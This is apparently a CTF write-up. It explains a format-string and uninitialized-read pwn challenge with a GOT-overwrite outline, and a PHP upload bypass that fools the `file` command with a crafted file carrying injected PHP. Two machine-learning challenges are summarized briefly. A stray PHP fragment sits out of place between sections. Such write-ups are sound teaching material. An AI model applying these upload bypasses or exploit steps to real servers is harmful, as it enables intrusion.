I also participated in the p4 ctf last weekend. I managed to solve two AI-related challenges, reminding me of the materials that I was doing during my undergraduate studies. There is also an interesting blind pwn challenge about fmt and uninitialized read vulnerability.

## Pwn

### Eat my bugs!

This is a blind pwn challenge, where only provides the source code. Can you identify the bug that offers us a way to control the fmt string?

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char nothing[] = "Nothing,";

char fruits[8][20] =
   {"Apple,", "Banana,", "Orange,", "Strawberry,",
	"Watermelon,", "Tomato,", "Lime,", "Avocado,"};

char vegetables[8][20] =
	{"Carrot,", "Cucumber,", "Corn,", "Zucchini,",
	"Potato,", "Asparagus,", "Broccoli,", "Cabbage,"};

char meats[8][20] =
	{"Pork,", "Beef,", "Chicken,", "Turkey,"
	"Duck,", "Lamb,", "Goat,", "Seafood,"};

char drinks[8][20] =
   {"Tea,", "Water,", "CocaCola,", "Sprite,",
	"Redbull,", "Coffee,", "Milk,", "Mojito,"};

char bugs[8][20] =
   {"Locust,", "Cricket,", "Honeybee,", "Beetle,",
	"Ants,", "Cockroach,", "Fly Larvae,", "Grasshopper,"};

int elements;
char name[0x20];

char *get_food(int type, int idx){
	if(idx < 0 || idx > 7){
			return nothing;
	}
	switch(type) {
		case 0:
			return fruits[idx];
		case 1:
			return vegetables[idx];
		case 2:
			return meats[idx];
		case 3:
			return drinks[idx];
		case 4:
			return bugs[idx];
		default:
			return nothing;
	}
}

void init() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void read_name() {
	printf("Tell me your name: ");
	int l = read(0, name, 0x20-1);
	name[l] = '\x00';
}

int read_int() {
	char tmp[0x20];
	memset(tmp, 0, 0x20);
	read(0, tmp, 0x20-1);
	return atoi(tmp);
}

void read_elements() {
	printf("How much elements on plate: ");
	int e = read_int();
	if(e < 2 || e > 5){
		printf("no no\n");
		exit(1);
	}
	elements = e;
}

void make_plate(){
	char plate[0x20];
	int plate_len = 0;

	for(int i=0;i<elements;i++){
			printf("Type of food: ");
			int type = read_int();
			printf("Idx: ");
			int idx = read_int();
			char *src = get_food(type, idx);
			int l = strlen(src);
			if(l > sizeof(plate) - plate_len) {
				printf("no no\n");
				exit(1);
			}
			memcpy(plate+plate_len, src, l);
			plate_len += l;
	}
	plate[plate_len-1]='\x00';

	printf("Good choice %s\n", name);
	printf("Here is your yummy plate:\n");
	printf(plate);
}

int main() {
	init();
	for(int people=0;people<3;people++) {
		read_name();
		read_elements();
		make_plate();
	}
}

```

The bug happens on lines `17` and `18` that a comma is missing between "Turkey" and "Duck". Therefore, the `meats` array only has 7 items. Interestingly, when I tried to compile the code using Clang, it issued a warning related to this particular error. Conversely, no such warning appeared when the code was compiled with GCC. This discrepancy highlights the importance of using multiple compilers to catch potential bugs.

![meow-1](/static/images/p4CTF-teaser-2023-Writeup/eat-my-bug-1.png)

The bug would help us achieve an uninitialized read in the `make_plate` function if the `get_food` function returns a string that has a length of 0, it will try to print out the origin value at the offset of the `plate` variable on the stack. And the value is just our input in the `read_elements` function.

```
"""
Solution:
	1/ leak the glibc address and elf loading address in the first round
	2/ overwrite the atoi@got to system@glibc in the second round
	3/ input `/bin/sh\x00` as the elements
"""
```

        fclose($template_file);

        if(is_good_template($_FILES['upload']['tmp_name'])){
            move_uploaded_file(

### Meow Share fixed

Building on the Meow Share challenge, they added additional checks before we can upload the template file as an admin. To exploit this block of code,

1. our uploaded file should pass both `is_good_png` _or_ leak the admin token in config.php(which is not intended)
2. our payload should bypass the`is_good_template`
3. inject PHP code in the upload template

```
function is_good_template($filepath) {
    // LOYO
    $file_info = exec("file " . $filepath);
    $stripped_filename = explode(' ', $file_info, 2)[1];
    return $stripped_filename === "HTML document, ASCII text";
}

function is_good_png($filepath) {
    // YOLO
    $file_info = exec("file " . $filepath);
    $stripped_filename = explode(' ', $file_info, 2)[1];
    return strpos($stripped_filename, "PNG image data, 250 x 250");
}


//...
if (isset($_FILES["upload"])) {
	// We should leak the `config.php` which contains the admin token
    $admin_rights = isset($_POST["token"]) && $_POST["token"] == $ADMIN_TOKEN;

	// upload file should pass the check in is_good_png
    if (!is_good_png($_FILES["upload"]["tmp_name"]) && !$admin_rights) {
        die("what are you doing?");
    }

    $extension = pathinfo($_FILES["upload"]["name"], PATHINFO_EXTENSION);
    if ($extension === "png") {
        move_uploaded_file(
            $_FILES['upload']['tmp_name'],
            $user_dir . "catty_" . time() . "." . $extension
        );
    } else if(isset($_POST["author"])) {
        $author = $_POST["author"];

        $template_file = fopen($_FILES['upload']['tmp_name'], "a");
        fwrite($template_file, "HTML template authored by " . htmlspecialchars($author));
        fclose($template_file);

		// upload file should pass the is_good_template check
        if(is_good_template($_FILES['upload']['tmp_name'])){
            move_uploaded_file(
                $_FILES['upload']['tmp_name'],
                $user_dir . "index.tpl"
            );
        } else {
            die("bad template");
        }
    } else {
        die("stop messing around!");
    }
}
```

So, our file would first check by `is_good_png` requires that output should have the substring `PNG image data, 250 x 250`. Then, our file would append the author's comment which is also user control but the content will be escaped. Finally, the output of our file at this time should strictly equal the `HTML document, ASCII text` string.

Since eventually the output of the `file` on our uploaded file should strictly equals `HTML, ASCII text` string. I first search for what are the rules that make the `file` command output this kind of

file type. Here is the answer:

- **HTML document**: If the file starts with a valid HTML doctype or an HTML tag (like `<html>`), then `file` will classify it as HTML. **It could also recognize it as HTML if the file contains HTML tags throughout the file, but this is not as reliable.**
- **ASCII text**: If the file contains only printable ASCII characters and is not recognized as any other specific type (like HTML), then `file` will classify it as ASCII text.

And more details can be found on this [page](https://github.com/file/file/blob/31a82018c2ed153b84ea5e115fa855de24eb46d1/magic/Magdir/sgml). Since it will append "HTML template authored by ", we have the chance to generate a HTML tag and fool the file command.

Next, we need to trick the `file` command output containing `PNG image data, 250 x 250`. The `file` command classifies the file type based on the magic number and file header. And it will output some content on the file header. In this case, we need to find a file type that is in ASCII and will print out the string that has various lengths on the header.
Here is the [repo](https://github.com/file/file/tree/master/magic/Magdir) that contains the magic header and the corresponding output of the file command.

We just need to find the output containing `%s` that it will try to print out something from the file itself. Here is one kind of file that will print out the string at offset 24 as the source.

```
# Basic recognition of Digital UNIX core dumps - Mike Bremford <mike@opac.bl.uk>
#
# The actual magic number is just "Core", followed by a 2-byte version
# number; however, treating any file that begins with "Core" as a Digital
# UNIX core dump file may produce too many false hits, so we include one
# byte of the version number as well; DU 5.0 appears only to be up to
# version 2.
#
0	string		Core\001	Alpha COFF format core dump (Digital UNIX)
>24	string		>\0		\b, from '%s'
0	string		Core\002	Alpha COFF format core dump (Digital UNIX)
>24	string		>\0		\b, from '%s'
```

```
with open('testfile', 'wb') as f:
	f.write(b'Core\001' + b'\x00' * 19 + b'PNG image data, 250 x 250\0')
```

![meow-1](/static/images/p4CTF-teaser-2023-Writeup/meow-fixed-1.png)

However, the priority of different magic header brings more difficulties as our file would match both rules. We need to find rules that are weaker than HTML tags so that it will print out the HTML file type after appending the HTML tag in the end of the file. This is also highly related to the version of the file command. Here is the payload from the @_crazyman_.

```
// payload from @crazyman
with open('testfile', 'wb') as f:
    f.write(b"##fileformat=VCFvPNG image data, 250 x 250\n")
    f.write(b"<?php phpinfo()?>\n")
    f.write(b"<!doctype")


with open('testfile-1', 'wb') as f:
	f.write(b"##fileformat=VCFvPNG image data, 250 x 250\n")
	f.write(b"<?php phpinfo() ?>\n")
	f.write(b"<!doctype ")

	f.write(b'HTML template authored by ') # append by the program
```

## AI

### GeoHacker

The task of the GeoHacker challenge was to analyze and exploit a machine learning model that predicts the geographical location of a panorama picture. The model works by classifying the picture into one of 6,301 classes, each corresponding to a distinct panorama image and its specific location.

To complete the challenge, we needed to provide five locations each associated with a panorama image that the model would incorrectly predict. Moreover, the haversine distance (a formula that calculates the distance between two points on the surface of a sphere) between the predicted and actual locations needed to be large enough for each of the five inputs. Upon successful fulfillment of these conditions, the flag would be revealed.

Initially, my strategy was to identify locations that were sufficiently distant from all labeled points (6,301 classes) and had a corresponding panorama picture. If such points existed, they would definitely meet the challenge requirements, since they would be far from the coordinates of any predicted category. However, this approach proved unsuccessful as I was unable to find such points within a reasonable timeframe.

With that strategy proving fruitless, I decided to change tack and began to fuzz the AI model directly. This meant I tried to generate a variety of inputs to test the model's ability to handle unexpected or extreme cases, in hopes of triggering an erroneous prediction. The details of this fuzzing process will be discussed in the next section.

### You have a point

In this challenge, we are given 10,000 data samples in a (x1, x2, y) format. The task at hand is to train a regression model within a time limit of a minute, which should achieve a mean square error (MSE) score of less than 0.4 on subsequent test samples.

After testing several machine learning models and neural networks, I opted to use the XGB regression model as it is fast in training and also achieves good scores which equal to the result after 200 epochs of training of MLP.
